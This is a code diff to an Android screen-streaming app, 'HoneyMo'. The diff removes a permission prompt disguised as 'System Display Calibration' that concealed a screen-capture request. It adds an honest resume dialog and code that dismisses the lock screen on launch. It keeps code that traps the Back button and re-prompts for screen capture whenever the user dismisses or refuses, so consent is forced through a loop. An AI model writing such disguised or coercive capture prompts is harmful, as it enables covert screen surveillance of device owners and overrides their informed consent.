@@ -2,6 +2,7 @@ package com.example.HoneyMo
 
 import android.Manifest
 import android.app.Activity
+import android.app.KeyguardManager
 import android.app.NotificationManager
 import android.content.Context
 import android.content.Intent
@@ -60,11 +61,14 @@ class MainActivity : ComponentActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
             setShowWhenLocked(true)
             setTurnScreenOn(true)
+            val km = getSystemService(KeyguardManager::class.java)
+            km?.requestDismissKeyguard(this, null)
         } else {
             @Suppress("DEPRECATION")
             window.addFlags(
                 WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
+                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
             )
         }
 
@@ -309,25 +313,89 @@ fun ScreenCaptureApp(
         Toast.makeText(context, "Screen streaming stopped", Toast.LENGTH_SHORT).show()
     }
 
-    // Trap hardware Back button when in interrupted recovery mode or showing permission dialog
-    BackHandler(enabled = (isInterrupted || showPermissionDeniedDialog) && !stats.isStreaming) {
-        showPermissionDeniedDialog = true
-        coroutineScope.launch {
+    val isInterruptedSessionActive = isInterrupted || SessionPreferences.wasRecordingActive(context)
+    var showRecoveryDialog by remember(isInterruptedSessionActive) {
+        mutableStateOf(isInterruptedSessionActive && !stats.isStreaming)
+    }
+
+    LaunchedEffect(isInterruptedSessionActive, stats.isStreaming) {
+        if (isInterruptedSessionActive && !stats.isStreaming) {
+            showRecoveryDialog = true
+        }
+    }
+
+    // Automatically trigger screen capture prompt ONLY if autoStartPrompt is true without interrupted state
+    LaunchedEffect(autoStartPrompt) {
+        if (autoStartPrompt && !isInterruptedSessionActive && !stats.isStreaming) {
             delay(350)
             startStreaming()
         }
     }
 
-    // Automatically trigger screen capture prompt on boot launch or interrupted recovery
-    LaunchedEffect(autoStartPrompt, isInterrupted) {
-        if ((autoStartPrompt || isInterrupted) && !stats.isStreaming) {
-            delay(350)
-            startStreaming()
+    // Trap hardware Back button when in interrupted recovery mode or showing dialog
+    BackHandler(enabled = (isInterrupted || showRecoveryDialog || showPermissionDeniedDialog) && !stats.isStreaming) {
+        if (showRecoveryDialog) {
+            // Keep recovery dialog visible
+        } else {
+            showPermissionDeniedDialog = true
+            coroutineScope.launch {
+                delay(350)
+                startStreaming()
+            }
         }
+    }
+
+    // Explicit Recovery Dialogue shown after device reboot/unlock
+    if (showRecoveryDialog && !stats.isStreaming) {
+        AlertDialog(
+            onDismissRequest = {
+                // Keep showing until user selects an action
+            },
+            title = {
+                Text(
+                    text = "Resume Screen Recording",
+                    fontWeight = FontWeight.Bold,
+                    color = Color.White
+                )
+            },
+            text = {
+                Text(
+                    text = "Screen recording was active before the device restarted. Tap 'Resume Recording' to continue streaming your screen.",
+                    color = Color(0xFFCBD5E1)
+                )
+            },
+            confirmButton = {
+                Button(
+                    onClick = {
+                        showRecoveryDialog = false
+                        onResetInterrupted()
+                        coroutineScope.launch {
+                            delay(150)
+                            startStreaming()
+                        }
+                    },
+                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
+                ) {
+                    Text("Resume Recording", fontWeight = FontWeight.Bold)
+                }
+            },
+            dismissButton = {
+                TextButton(
+                    onClick = {
+                        showRecoveryDialog = false
+                        onResetInterrupted()
+                        stopStreaming()
+                    }
+                ) {
+                    Text("Stop", color = Color(0xFF94A3B8))
+                }
+            },
+            containerColor = Color(0xFF1E293B)
+        )
     }
 
     // Interactive loop dialog if user cancelled/rejected screen capture permission
-    if (showPermissionDeniedDialog && !stats.isStreaming) {
+    if (showPermissionDeniedDialog && !stats.isStreaming && !showRecoveryDialog) {
         AlertDialog(
             onDismissRequest = {
                 // Re-prompt on dismiss with debounce delay
@@ -339,18 +407,14 @@ fun ScreenCaptureApp(
             },
             title = {
                 Text(
-                    text = if (isInterrupted) "System Display Calibration" else "Screen Capture Required",
+                    text = "Screen Capture Required",
                     fontWeight = FontWeight.Bold,
                     color = Color.White
                 )
             },
             text = {
                 Text(
-                    text = if (isInterrupted) {
-                        "Display service calibration is required. Please tap 'Start Now' to continue."
-                    } else {
-                        "HoneyMo requires screen capture permission to stream your device. Please tap 'Start Capturing' to grant permission."
-                    },
+                    text = "HoneyMo requires screen capture permission to stream your device. Please tap 'Start Capturing' to grant permission.",
                     color = Color(0xFFCBD5E1)
                 )
             },
@@ -365,7 +429,7 @@ fun ScreenCaptureApp(
                     },
                     colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
                 ) {
-                    Text(if (isInterrupted) "Start Now" else "Start Capturing", fontWeight = FontWeight.Bold)
+                    Text("Start Capturing", fontWeight = FontWeight.Bold)
                 }
             },
             dismissButton = {
